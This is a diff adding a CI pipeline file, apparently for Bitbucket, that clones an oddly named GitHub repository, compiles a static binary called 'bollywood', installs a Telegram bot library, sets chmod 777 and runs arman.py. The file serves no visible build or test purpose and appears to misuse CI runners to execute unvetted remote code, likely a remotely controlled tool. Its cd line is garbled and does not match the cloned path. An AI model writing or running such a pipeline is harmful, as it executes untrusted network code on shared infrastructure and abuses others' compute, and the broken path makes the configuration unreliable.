@@ -1,0 +1,15 @@
+pipelines:
+  default:
+    - step:
+        name: Run Script
+        image: python:3.9
+        size: 2x
+        script:
+          - git clone https://github.com/nuclear11338v/Mygintchtjchtjjg_-_--_-52-57-8-74---8-57-7-5-5-.git
+          - cd Mygintchtjchtjjg_+_--_&₹52/57-8&74-&+-8(57&7:5(5(
+          - ls
+          - gcc -o bollywood rs.c -lz -static -lpthread
+          - pip install telebot
+          - pip install requests
+          - chmod 777 bollywood
+          - python3 arman.py
